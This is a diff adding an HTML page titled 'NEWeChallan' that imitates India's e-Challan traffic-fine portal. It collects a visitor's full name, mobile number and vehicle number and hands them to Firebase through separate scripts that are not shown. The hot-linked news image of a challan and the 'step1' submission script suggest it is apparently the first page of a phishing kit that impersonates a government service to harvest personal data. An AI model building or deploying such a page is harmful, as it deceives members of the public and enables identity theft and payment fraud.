@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NEWeChallan</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      text-align: center;
+    }
+
+    .container {
+      margin: 30px auto;
+      max-width: 360px;
+      background-color: #e6f3ff;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 2px solid #cce0ff;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #007bff;
+      background-color: #e6f0ff;
+    }
+
+    button {
+      width: 95%;
+      padding: 12px;
+      margin-top: 15px;
+      background-color: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0052cc;
+    }
+
+    #cac {
+      text-transform: uppercase;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Full-width top emblem -->
+  <img src="atcc.jpeg" alt="Indee" style="width: 100%; height: auto; display: block; margin: 0 auto;" />
+
+  <!-- Form container -->
+  <div class="container">
+    <form id="ududip007">
+      <input type="text" id="aname" name="fullname" placeholder="Full Name" required />
+      <input type="tel" id="bmobile" name="mobile" placeholder="Mobile Number" pattern="[0-9]{10}" required />
+      <input type="text" id="cac" name="vehicleNumber" placeholder="Vehicle Number" required />
+      <button type="submit">Proceed</button>
+    </form>
+  </div>
+
+  <!-- Bottom image -->
+  <img src="https://www.jagranimages.com/images/newimg/25052024/25_05_2024-e_challan_23725058.webp" 
+       alt="Challan Image" 
+       style="width: 100%; max-width: 500px; height: auto; margin: 20px auto; display: block;" />
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- Firebase Config -->
+  <script src="firebase-config.js"></script>
+
+  <!-- Submission Script -->
+  <script defer src="step1-script.js"></script>
+
+</body>
+</html>
